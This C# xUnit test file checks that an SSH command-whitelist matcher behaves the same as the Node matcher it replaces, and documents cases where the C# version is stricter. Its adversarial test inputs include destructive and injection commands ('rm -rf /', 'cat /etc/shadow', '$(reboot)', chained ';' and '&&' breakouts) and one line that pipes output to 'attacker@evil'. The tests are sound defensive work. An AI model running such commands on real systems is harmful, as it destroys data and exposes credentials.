using System.Text.RegularExpressions;
using Sshgw.Mcp;
using Xunit;

namespace Sshgw.Mcp.Tests;

/// <summary>
/// THE WHITELIST BYTE-PARITY SUITE — the hard merge gate (proposal #22 §7 item 1).
///
/// <para>
/// The C# <see cref="CommandWhitelist"/> replaces the live Node
/// <c>@fangjunjie/ssh-mcp-server</c> matcher, whose behaviour is EXACTLY:
/// <code>
///   whitelist.split("|").map(p =&gt; new RegExp(p)).some(r =&gt; r.test(cmd))
/// </code>
/// This suite proves the C# matcher is <b>byte-identical to the Node matcher
/// except for three documented intentional divergences</b>, all of which make C#
/// <i>stricter</i> (never more permissive). It does this by running a DIFFERENTIAL
/// ORACLE: a faithful, SEPARATE reimplementation of the Node semantics
/// (<see cref="NodeMatcherOracle"/>), and asserting
/// <c>CommandWhitelist.IsAllowed(cmd) == oracle(whitelist, cmd)</c> for EVERY
/// (whitelist, cmd) row in the parity matrix.
/// </para>
///
/// <para>
/// <b>Parity matrix scope — what rows are included:</b> well-formed production
/// whitelist shapes (bounded-read, router-with-writes, broad-read) and an empty
/// string. Empty-piece whitelists (leading/trailing/double <c>|</c>, bare <c>|</c>)
/// are EXCLUDED from this matrix because they diverge by design; they are instead
/// covered with explicit divergence assertions in
/// <see cref="CommandWhitelistEmptyPieceDivergenceTests"/> which pin that C# is
/// strictly safer (fail-closed) where Node is fail-open.
/// </para>
///
/// <para>
/// <b>The three documented intentional divergences</b> (C# is always the stricter side):
/// <list type="number">
///   <item><term>Empty-piece whitelist</term>
///     <description>Node keeps empty pieces → <c>new RegExp("")</c> → allow-all
///     (fail-open). C# drops them via <c>RemoveEmptyEntries</c> → fail-closed.
///     Pinned by <see cref="CommandWhitelistEmptyPieceDivergenceTests"/>.</description></item>
///   <item><term>Whitespace-only whitelist</term>
///     <description>C# <c>IsNullOrWhiteSpace</c> → allow-all; Node compiles literal
///     spaces → almost-nothing. Degenerate misconfiguration only.
///     Pinned by <see cref="Whitespace_only_whitelist_is_a_documented_intended_divergence"/>.</description></item>
///   <item><term>Internal-<c>|</c> crash-parity</term>
///     <description>Both C# and Node throw on torn unbalanced-paren pieces — the
///     crash is the parity.
///     Pinned by <see cref="Internal_pipe_alternation_is_crash_parity_BOTH_throw"/>.</description></item>
/// </list>
/// C# is <b>never more permissive than Node</b> on any of these families.
/// </para>
///
/// <para>
/// DE-POSITIONING CONSTRAINT: every whitelist string below is NEUTRAL / SYNTHETIC.
/// It exercises the SEMANTICS the three production whitelist SHAPES rely on
/// (self-anchoring <c>^…$</c>, <c>|</c>-split into independent patterns, a broad-read
/// <c>^cat \S+</c> style entry, alternation expansion, and the no-internal-<c>|</c>
/// invariant) — WITHOUT committing any homelab real whitelist, CT name, or
/// bernex-proxmox specifics. This repo is public-bound; the REAL-whitelist
/// byte-parity is proven separately at SHADOW time against the live (private) Node
/// server, never here.
/// </para>
/// </summary>
public sealed class CommandWhitelistParityTests
{
    /// <summary>Raised by the oracle to mirror Node's <c>new RegExp(bad)</c> throwing
    /// <c>SyntaxError</c> inside the <c>.map()</c> — which aborts the WHOLE matcher
    /// before <c>.some()</c> ever runs. The C# matcher likewise throws
    /// (<see cref="System.Text.RegularExpressions.RegexParseException"/>) on an
    /// invalid piece; the crash-parity test pins that BOTH throw on a torn input.</summary>
    private sealed class OracleRegexSyntaxError : Exception
    {
        public OracleRegexSyntaxError(string message) : base(message) { }
    }

    /// <summary>
    /// A faithful, SEPARATE reimplementation of the Node matcher semantics. It is
    /// intentionally NOT a call into <see cref="CommandWhitelist"/> — it is the
    /// independent oracle the port is diffed against.
    ///
    /// Node, exactly:
    /// <code>whitelist.split("|").map(p =&gt; new RegExp(p)).some(r =&gt; r.test(cmd))</code>
    ///   - <c>String.split("|")</c> keeps EMPTY pieces (JS never drops them).
    ///   - <c>.map(p =&gt; new RegExp(p))</c> compiles EVERY piece EAGERLY; an invalid
    ///     piece throws <c>SyntaxError</c> and aborts the whole expression (the mirror:
    ///     <see cref="OracleRegexSyntaxError"/>).
    ///   - <c>new RegExp(piece)</c> is UNANCHORED (partial match via <c>.test</c>).
    ///   - <c>.some(...)</c> ORs the per-piece <c>.test</c> results.
    /// An empty piece's regex matches everything (<c>new RegExp("").test(x)</c> is
    /// always true), so a leading/trailing '|' makes the matcher allow-all.
    /// </summary>
    private static bool NodeMatcherOracle(string whitelist, string cmd)
    {
        // JS: "".split("|") === [""]; "a|".split("|") === ["a",""]. C#'s
        // string.Split('|') with no options keeps empties too — the faithful mirror.
        var pieces = whitelist.Split('|');

        // .map(new RegExp) — EAGER compile of every piece; a bad piece throws here,
        // before any .test runs. .NET's ECMAScript option is the closest JS-regex
        // semantics for these ASCII patterns.
        var compiled = new Regex[pieces.Length];
        for (int i = 0; i < pieces.Length; i++)
        {
            try
            {
                compiled[i] = new Regex(pieces[i], RegexOptions.ECMAScript | RegexOptions.CultureInvariant);
            }
            catch (ArgumentException ex)
            {
                throw new OracleRegexSyntaxError($"invalid regex piece '{pieces[i]}': {ex.Message}");
            }
        }

        // .some(r => r.test(cmd))
        foreach (var re in compiled)
            if (re.IsMatch(cmd)) return true;
        return false;
    }

    // ── SYNTHETIC whitelist SHAPES ────────────────────────────────────────────
    // Each string exercises a semantic property of a production shape without being
    // a real homelab whitelist.

    /// <summary>SHAPE A — bounded read-set: a handful of fully-anchored, exact or
    /// tightly-argument-bounded read commands (mirrors the "bounded LXC read-set").</summary>
    private const string ShapeBoundedRead =
        @"^uptime$|^whoami$|^df -h$|^free -m$|^systemctl status [a-z0-9@._-]+$|^journalctl -u [a-z0-9@._-]+ -n [0-9]+$";

    /// <summary>SHAPE B — router-with-writes: anchored reads PLUS a couple of anchored
    /// WRITE commands (mirrors "OpenWrt router entries WITH writes"). Uses neutral
    /// verbs so no real router command is committed.</summary>
    private const string ShapeRouterWithWrites =
        @"^svc-list$|^svc-show [a-z0-9-]+$|^svc-reload [a-z0-9-]+$|^cfg-set [a-z0-9.]+ [a-z0-9.]+$";

    /// <summary>SHAPE C — broad-read: the permissive read primitives that match a
    /// whole family of paths via <c>\S+</c> / <c>.*</c> (mirrors the "bernex-proxmox
    /// BROAD-READ set" of <c>^cat \S+</c>, <c>^grep .*</c>, <c>^head .*</c>,
    /// <c>^tail .*</c>, <c>^find \S+.*</c>). Neutral primitives, same SEMANTICS.</summary>
    private const string ShapeBroadRead =
        @"^cat \S+$|^head \S+$|^tail \S+$|^grep .*$|^find \S+.*$";

    private static readonly string[] AllShapes =
    {
        "",                        // empty ⇒ C# allow-all; Node allow-all via [""] → matches everything (parity holds)
        ShapeBoundedRead,
        ShapeRouterWithWrites,
        ShapeBroadRead,
        // Alternation-expansion shape: a bounded, self-anchored pattern whose single
        // piece expands to a FAMILY of accepted forms via a character class + quantifier
        // (legal — no internal '|', so the split does not tear it).
        @"^ls -[la]+$",
        // A single anchored exact command.
        "^id$",
    };

    // ── command corpus ────────────────────────────────────────────────────────
    // A broad mix of ALLOW-shaped and adversarial REJECT-shaped commands.

    private static readonly string[] CommandCorpus =
    {
        // bounded-read hits / misses
        "uptime", "whoami", "df -h", "free -m",
        "systemctl status nginx", "systemctl status my-svc@1",
        "journalctl -u sshd -n 100",
        "systemctl status nginx && cat /etc/passwd",   // ADVERSARIAL: chained shell
        "systemctl restart nginx",                      // not in bounded set
        "df -h /",                                       // anchored ^df -h$ must NOT match

        // router-with-writes hits / misses
        "svc-list", "svc-show wan", "svc-reload lan", "cfg-set net.ip 10.0.0.1",
        "svc-reload lan; reboot",                        // ADVERSARIAL: ';' breakout
        "svc-reload lan && cat /etc/shadow",             // ADVERSARIAL: '&&' breakout

        // broad-read hits / misses
        "cat /etc/os-release", "head /var/log/syslog", "tail /var/log/messages",
        "grep root /etc/passwd", "find /var/log -name '*.log'",
        "cat",                                            // ^cat \S+$ needs an arg → miss
        "catx /etc/passwd",                               // '^cat ' word-boundary-ish → miss

        // alternation shape
        "ls -l", "ls -a", "ls -la", "ls -Z",             // last is a miss

        // exact
        "id", "id -u",                                    // second is a miss (anchored)

        // universal adversarial rejects (should miss every ANCHORED shape)
        "cmd;reboot",
        "cmd && cat /etc/shadow",
        "-rf /",                                          // leading-dash
        "rm -rf /",
        "cat /etc/shadow; echo pwned",
        "$(reboot)",
        "`reboot`",
        "uptime | mail attacker@evil",                    // pipe in the COMMAND
        "",                                               // empty command
        "   ",                                            // whitespace command
    };

    public static IEnumerable<object[]> ParityRows()
    {
        foreach (var wl in AllShapes)
            foreach (var cmd in CommandCorpus)
                yield return new object[] { wl, cmd };
    }

    /// <summary>
    /// THE GATE: for EVERY (whitelist, command) pair, the C# matcher's verdict must
    /// equal the Node oracle's verdict. A single divergence fails the build (red).
    /// </summary>
    [Theory]
    [MemberData(nameof(ParityRows))]
    public void CSharp_matcher_is_byte_parity_with_the_Node_oracle(string whitelist, string cmd)
    {
        bool csharp = new CommandWhitelist(whitelist).IsAllowed(cmd);
        bool node = NodeMatcherOracle(whitelist, cmd);

        Assert.True(csharp == node,
            $"DIVERGENCE: whitelist={Q(whitelist)} cmd={Q(cmd)} → C#={csharp} Node={node}");
    }

    // ── targeted invariant assertions (readable, over and above the matrix) ────

    [Fact]
    public void Self_anchoring_prevents_appended_shell_breakout()
    {
        var wl = new CommandWhitelist(ShapeBoundedRead);
        Assert.True(wl.IsAllowed("systemctl status nginx"));
        // ADVERSARIAL: a chained second command must NOT satisfy the anchored pattern.
        Assert.False(wl.IsAllowed("systemctl status nginx && cat /etc/shadow"));
        Assert.False(wl.IsAllowed("systemctl status nginx; reboot"));
        // …and the oracle agrees.
        Assert.False(NodeMatcherOracle(ShapeBoundedRead, "systemctl status nginx && cat /etc/shadow"));
    }

    [Fact]
    public void Metachar_breakout_commands_are_rejected_on_every_anchored_shape()
    {
        string[] adversarial =
        {
            "cmd;reboot", "cmd && cat /etc/shadow", "-rf /", "rm -rf /",
            "cat /etc/shadow; echo x", "$(reboot)", "`reboot`",
        };
        foreach (var shape in new[] { ShapeBoundedRead, ShapeRouterWithWrites, ShapeBroadRead })
        {
            var wl = new CommandWhitelist(shape);
            foreach (var cmd in adversarial)
            {
                Assert.False(wl.IsAllowed(cmd), $"{Q(shape)} wrongly allowed {Q(cmd)}");
                Assert.Equal(NodeMatcherOracle(shape, cmd), wl.IsAllowed(cmd));
            }
        }
    }

    [Fact]
    public void Broad_read_shape_matches_the_family_but_not_a_bare_verb()
    {
        var wl = new CommandWhitelist(ShapeBroadRead);
        Assert.True(wl.IsAllowed("cat /etc/os-release"));   // ^cat \S+$
        Assert.True(wl.IsAllowed("grep root /etc/passwd")); // ^grep .*$
        Assert.False(wl.IsAllowed("cat"));                  // needs an argument
        Assert.False(wl.IsAllowed("catnip /x"));            // must be the word 'cat '
    }

    [Fact]
    public void Unbounded_read_on_a_bounded_set_is_rejected()
    {
        // A broad ^cat \S+ style command must NOT be allowed by the BOUNDED-read
        // shape (which has no cat entry) — the shapes are independent.
        var bounded = new CommandWhitelist(ShapeBoundedRead);
        Assert.False(bounded.IsAllowed("cat /etc/shadow"));
        Assert.False(bounded.IsAllowed("find / -name id_rsa"));
        Assert.Equal(NodeMatcherOracle(ShapeBoundedRead, "cat /etc/shadow"), bounded.IsAllowed("cat /etc/shadow"));
    }

    [Fact]
    public void Alternation_inside_a_single_piece_expands_correctly()
    {
        // A self-anchored piece with NO internal '|' — a character-class + quantifier
        // expands to a family without being torn by the split.
        var wl = new CommandWhitelist(@"^ls -[la]+$");
        Assert.True(wl.IsAllowed("ls -l"));
        Assert.True(wl.IsAllowed("ls -a"));
        Assert.True(wl.IsAllowed("ls -la"));
        Assert.True(wl.IsAllowed("ls -al"));
        Assert.False(wl.IsAllowed("ls -Z"));
        Assert.False(wl.IsAllowed("ls -l; reboot"));
        // …and the oracle agrees on each.
        foreach (var cmd in new[] { "ls -l", "ls -a", "ls -la", "ls -Z", "ls -l; reboot" })
            Assert.Equal(NodeMatcherOracle(@"^ls -[la]+$", cmd), wl.IsAllowed(cmd));
    }

    [Fact]
    public void Internal_pipe_alternation_is_crash_parity_BOTH_throw()
    {
        // THE no-internal-| INVARIANT, proven by CONSTRUCTION:
        // A whitelist author who wrote a single logical pattern using an internal '|'
        // alternation (e.g. "^(uptime|whoami)$") gets it TORN by the '|' split into
        //   ["^(uptime", "whoami)$"]
        // Each torn piece is an UNBALANCED-paren regex. In Node, `.map(new RegExp)`
        // throws SyntaxError on the first invalid piece and the whole matcher aborts.
        // In C#, the CommandWhitelist constructor likewise compiles every piece
        // eagerly and throws RegexParseException. So the CRASH is the parity: both
        // implementations REFUSE to build such a whitelist rather than silently
        // mis-matching — a fail-safe outcome, identical on both sides. The gate pins
        // that BOTH throw (never that one silently allows).
        const string torn = "^(uptime|whoami)$";

        // C# throws at construction.
        Assert.ThrowsAny<System.Text.RegularExpressions.RegexParseException>(
            () => new CommandWhitelist(torn));

        // The Node oracle throws its SyntaxError mirror on any command.
        Assert.ThrowsAny<Exception>(() => NodeMatcherOracle(torn, "uptime"));
    }

    [Fact]
    public void Empty_whitelist_is_allow_all_in_both_implementations()
    {
        // C# treats an EMPTY whitelist as allow-all. The Node oracle agrees:
        // "".split("|") is [""], and new RegExp("").test(x) is always true → allow-all
        // too. Parity holds on the empty case, which is the only "no whitelist" spelling
        // a production server should ever carry.
        foreach (var cmd in new[] { "uptime", "rm -rf /", "" })
        {
            Assert.True(new CommandWhitelist("").IsAllowed(cmd));
            Assert.True(NodeMatcherOracle("", cmd));
        }
    }

    [Fact]
    public void Whitespace_only_whitelist_is_a_documented_intended_divergence()
    {
        // INTENDED, DOCUMENTED DIVERGENCE (not part of the byte-parity claim):
        // C# IsNullOrWhiteSpace-treats a whitespace-ONLY whitelist as allow-all,
        // whereas the Node matcher would compile the literal spaces as a regex that
        // matches almost nothing. This only affects a DEGENERATE misconfiguration
        // (a real server carries either an explicit pattern set or a truly empty
        // string); the C# hardening comment states allow-all is "only for a server
        // that intentionally has none". We pin the C# behaviour explicitly so it is a
        // conscious contract, not an accident, and keep it OUT of the parity matrix.
        Assert.True(new CommandWhitelist("   ").AllowAll);
        Assert.True(new CommandWhitelist("   ").IsAllowed("uptime"));
        Assert.False(NodeMatcherOracle("   ", "uptime")); // the divergence, asserted
    }

    private static string Q(string s) => "\"" + s.Replace("\"", "\\\"") + "\"";
}

/// <summary>
/// INTENTIONAL DIVERGENCE — empty-piece whitelist family.
///
/// <para>
/// This class documents and pins a KNOWN, DELIBERATE behavioural difference between
/// the C# <see cref="CommandWhitelist"/> and the Node incumbent on whitelists that
/// contain one or more empty pieces (produced by a leading, trailing, or double '|'):
/// </para>
///
/// <list type="bullet">
///   <item>
///     <term>Node (fail-open)</term>
///     <description>
///       <c>whitelist.split("|")</c> keeps empty pieces.  An empty piece becomes
///       <c>new RegExp("")</c>, which matches EVERY string via <c>.test(x)</c>.
///       Therefore any whitelist that contains an empty piece is silently
///       allow-all — a critical security hazard on a malformed entry.
///     </description>
///   </item>
///   <item>
///     <term>C# (fail-closed)</term>
///     <description>
///       <c>whitelist.Split('|', StringSplitOptions.RemoveEmptyEntries)</c> DROPS
///       empty pieces.  The surviving non-empty patterns are the only ones compiled.
///       A whitelist like <c>"^uptime$|"</c> (trailing pipe) produces exactly one
///       pattern (<c>^uptime$</c>): a non-uptime command is REJECTED.
///       A bare <c>"|"</c> or <c>"||"</c> with no non-empty pieces produces an
///       empty pattern array, so every command is REJECTED.
///     </description>
///   </item>
/// </list>
///
/// <para>
/// <b>C# is STRICTLY SAFER on malformed inputs.</b>  The invariant asserted here is
/// one-directional: wherever Node would ALLOW-ALL due to an empty piece, C# REJECTS.
/// There is NO row where C# allows what Node rejects (i.e. C# is never more
/// permissive than Node on this family).
/// </para>
///
/// <para>
/// <b>Practical impact is zero.</b>  Production server-registry whitelists contain
/// no empty pieces — confirmed at shadow time against the live Node server.  This
/// divergence is therefore a deliberate security improvement, not a compatibility
/// gap, and it is explicitly excluded from the byte-parity claim in
/// <see cref="CommandWhitelistParityTests"/>.
/// </para>
/// </summary>
public sealed class CommandWhitelistEmptyPieceDivergenceTests
{
    // ── Oracle (copy of the one in CommandWhitelistParityTests) ─────────────────
    // The oracle is duplicated here so this class is self-contained and the
    // divergence test is readable without navigating the parent suite.
    private static bool NodeOracleAllows(string whitelist, string cmd)
    {
        var pieces = whitelist.Split('|');   // JS keeps empty pieces
        var compiled = new Regex[pieces.Length];
        for (int i = 0; i < pieces.Length; i++)
            compiled[i] = new Regex(pieces[i], RegexOptions.ECMAScript | RegexOptions.CultureInvariant);
        foreach (var re in compiled)
            if (re.IsMatch(cmd)) return true;
        return false;
    }

    // ── Empty-piece whitelist inputs ─────────────────────────────────────────────

    /// <summary>
    /// Trailing pipe: <c>"^uptime$|"</c>.
    /// Node sees ["^uptime$", ""] → new RegExp("") matches everything → allow-all.
    /// C# sees one piece ["^uptime$"] → only uptime is allowed.
    /// </summary>
    [Theory]
    [InlineData("not-uptime")]
    [InlineData("rm -rf /")]
    [InlineData("cat /etc/shadow")]
    [InlineData("$(reboot)")]
    [InlineData("")]
    public void Trailing_pipe_CSharp_rejects_nonMatching_cmd_where_Node_allows_all(string cmd)
    {
        const string whitelist = "^uptime$|";

        bool csharp = new CommandWhitelist(whitelist).IsAllowed(cmd);
        bool node = NodeOracleAllows(whitelist, cmd);

        // C# is fail-closed: non-uptime commands are REJECTED.
        Assert.False(csharp,
            $"SECURITY REGRESSION: C# allowed '{cmd}' on trailing-pipe whitelist '{whitelist}'");

        // Node is fail-open: the empty piece makes it allow-all.
        Assert.True(node,
            $"Oracle assumption broken: Node did not allow-all on '{whitelist}' for cmd '{cmd}'");

        // THE INVARIANT: C# is NEVER more permissive than Node.
        // i.e. there must be no row where C#=true and Node=false.
        Assert.False(csharp && !node,
            $"INVARIANT VIOLATED: C# allowed '{cmd}' but Node did not on whitelist '{whitelist}'");
    }

    /// <summary>
    /// Leading pipe: <c>"|^uptime$"</c>.
    /// Node sees ["", "^uptime$"] → first empty piece matches everything → allow-all.
    /// C# sees one piece ["^uptime$"] → only uptime is allowed.
    /// </summary>
    [Theory]
    [InlineData("not-uptime")]
    [InlineData("rm -rf /")]
    [InlineData("cat /etc/passwd")]
    [InlineData("`reboot`")]
    [InlineData("")]
    public void Leading_pipe_CSharp_rejects_nonMatching_cmd_where_Node_allows_all(string cmd)
    {
        const string whitelist = "|^uptime$";

        bool csharp = new CommandWhitelist(whitelist).IsAllowed(cmd);
        bool node = NodeOracleAllows(whitelist, cmd);

        Assert.False(csharp,
            $"SECURITY REGRESSION: C# allowed '{cmd}' on leading-pipe whitelist '{whitelist}'");
        Assert.True(node,
            $"Oracle assumption broken: Node did not allow-all on '{whitelist}' for cmd '{cmd}'");
        Assert.False(csharp && !node,
            $"INVARIANT VIOLATED: C# allowed '{cmd}' but Node did not on whitelist '{whitelist}'");
    }

    /// <summary>
    /// Double pipe: <c>"^foo$||^bar$"</c>.
    /// Node sees ["^foo$", "", "^bar$"] → empty piece makes it allow-all.
    /// C# sees ["^foo$", "^bar$"] → only foo and bar are allowed.
    /// </summary>
    [Theory]
    [InlineData("not-foo")]
    [InlineData("rm -rf /")]
    [InlineData("$(id)")]
    [InlineData("baz")]
    [InlineData("")]
    public void Double_pipe_CSharp_rejects_nonMatching_cmd_where_Node_allows_all(string cmd)
    {
        const string whitelist = "^foo$||^bar$";

        bool csharp = new CommandWhitelist(whitelist).IsAllowed(cmd);
        bool node = NodeOracleAllows(whitelist, cmd);

        Assert.False(csharp,
            $"SECURITY REGRESSION: C# allowed '{cmd}' on double-pipe whitelist '{whitelist}'");
        Assert.True(node,
            $"Oracle assumption broken: Node did not allow-all on '{whitelist}' for cmd '{cmd}'");
        Assert.False(csharp && !node,
            $"INVARIANT VIOLATED: C# allowed '{cmd}' but Node did not on whitelist '{whitelist}'");
    }

    /// <summary>
    /// Bare pipe: <c>"|"</c> — no non-empty pieces at all.
    /// Node sees ["", ""] → two empty-piece regexes → allow-all.
    /// C# sees no pieces after RemoveEmptyEntries → AllowAll=false, patterns=[] → every command REJECTED.
    /// </summary>
    [Theory]
    [InlineData("uptime")]
    [InlineData("rm -rf /")]
    [InlineData("")]
    [InlineData("anything")]
    public void Bare_pipe_CSharp_rejects_all_cmds_where_Node_allows_all(string cmd)
    {
        const string whitelist = "|";

        var wl = new CommandWhitelist(whitelist);
        bool csharp = wl.IsAllowed(cmd);
        bool node = NodeOracleAllows(whitelist, cmd);

        // C# has no patterns → everything rejected (not allow-all).
        Assert.False(wl.AllowAll,
            "SECURITY REGRESSION: C# treated bare '|' as allow-all");
        Assert.False(csharp,
            $"SECURITY REGRESSION: C# allowed '{cmd}' on bare-pipe whitelist");
        Assert.True(node,
            $"Oracle assumption broken: Node did not allow-all on '|' for cmd '{cmd}'");
        Assert.False(csharp && !node,
            $"INVARIANT VIOLATED: C# allowed '{cmd}' but Node did not on whitelist '|'");
    }

    /// <summary>
    /// Confirms the uptime-MATCHING command IS allowed by the trailing-pipe whitelist in C#
    /// (the non-empty piece survives) — so the divergence does not accidentally break the
    /// valid allow case and is strictly a narrowing, never a widening.
    /// </summary>
    [Fact]
    public void Trailing_pipe_valid_pattern_piece_still_matches_in_CSharp()
    {
        const string whitelist = "^uptime$|";
        Assert.True(new CommandWhitelist(whitelist).IsAllowed("uptime"),
            "The non-empty pattern piece must still match; C# must not strip valid pieces");
    }

    /// <summary>
    /// Summary invariant: for ALL empty-piece whitelists in this corpus, C# is NEVER
    /// more permissive than Node. Specifically, for every (whitelist, cmd) pair
    /// below, it must NEVER be the case that C#=true and Node=false.
    /// </summary>
    [Theory]
    [InlineData("^uptime$|",    "not-uptime")]
    [InlineData("^uptime$|",    "rm -rf /")]
    [InlineData("|^uptime$",    "not-uptime")]
    [InlineData("|^uptime$",    "cat /etc/shadow")]
    [InlineData("^foo$||^bar$", "baz")]
    [InlineData("^foo$||^bar$", "$(id)")]
    [InlineData("|",            "uptime")]
    [InlineData("|",            "rm -rf /")]
    [InlineData("|",            "anything")]
    public void CSharp_is_never_more_permissive_than_Node_on_empty_piece_whitelists(
        string whitelist, string cmd)
    {
        bool csharp = new CommandWhitelist(whitelist).IsAllowed(cmd);
        bool node = NodeOracleAllows(whitelist, cmd);

        // The invariant: C# may EQUAL or be STRICTER than Node; never more permissive.
        Assert.False(csharp && !node,
            $"INVARIANT VIOLATED: C#=true, Node=false on whitelist={Q(whitelist)} cmd={Q(cmd)}. " +
            "C# must never allow what Node rejects on this family.");
    }

    private static string Q(string s) => "\"" + s.Replace("\"", "\\\"") + "\"";
}
